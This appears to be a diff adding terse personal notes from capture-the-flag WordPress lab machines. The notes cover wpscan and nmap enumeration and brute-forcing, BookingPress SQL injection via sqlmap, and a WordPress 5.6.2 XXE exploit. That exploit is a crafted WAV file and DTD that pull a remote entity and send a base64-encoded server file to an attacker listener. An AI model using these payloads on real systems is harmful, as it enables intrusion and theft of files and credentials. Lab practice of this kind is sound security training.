@@ -1,0 +1,41 @@
+wordpress
+
+wpscan --url ip --enumerate t or v or u
+
+using nmap
+
+nmap --script=http-wordpress-users.nse,http-wordpress-enum.nse,http-wordpress-brute.nse ip
+
+nmap -p 80 -vv --script http-wordpress-enum --script-args type="plugins",search-limit=1500 127.0.0.1
+
+after editing 404 php go here
+
+http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
+
+path2:
+
+creck the bookingpress version from inspect then search exploit
+
+we got 1.0.10 so the post is https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357
+
+curl gives some info ..so remove the payload and send it in sqlmap. then it will give some creds
+
+https://0xdedinfosec.vercel.app/blog/hackthebox-metatwo-writeup
+
+login in wordpress with them
+
+wordpress 5.6.2 exploit is by wav file
+
+make a file evil.dtd
+
+`<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/metapress.htb/blog/wp>`
+
+`<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.9:8001/?p=%file;'>" >`
+
+`the wav file is`
+
+`echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.9:8001/dedsec.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav`
+
+then do php -S 0.0.0.0:8001 and get the base64 encoded value of the file
+
+thus we got creds for ftp and thus got got shell
